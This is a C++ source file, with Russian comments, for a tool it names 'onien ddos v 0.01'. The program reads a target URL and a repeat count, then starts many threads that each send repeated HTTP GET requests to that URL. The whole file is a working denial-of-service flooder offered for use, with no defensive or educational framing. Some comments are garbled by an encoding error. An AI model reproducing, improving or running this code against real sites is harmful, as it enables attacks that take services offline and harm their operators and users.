#include <cpr/cpr.h> //реквесты
#include<thread>

#include <Windows.h>
#include <iostream>
#include <string> //дл€ работы со строками
#include <stdio.h>
#include <ppltasks.h>

using namespace std;
using namespace cpr;

vector<thread> threads;


void request(string url) {
	auto response = Get(Url{ url });
	cout << "yes!" << endl;
}

void ddosRequests(int retrys, string url) {
	long int iter = 0;
	for (iter; iter <= retrys; iter++) { //кол-во повторений
		request(url);
	}
}

int main() {

	setlocale(LC_ALL, "Russian");

	int retryes; //повторы

	string urlDdos; //url ддоса

	cout << "onien ddos v 0.01" << endl;

	//запрашиваем кол-во повторений

	cout << " ол-во повторений: ";
	cin >> retryes;

	//запрашиваем url

	cout << "Url ддоса: ";
	cin >> urlDdos;

	for (int iters = 0; iters <= retryes; iters++) {
		threads.emplace_back(ddosRequests, ref(retryes), ref(urlDdos));
	}
	for (auto& thr : threads) {
		thr.join();
	}
}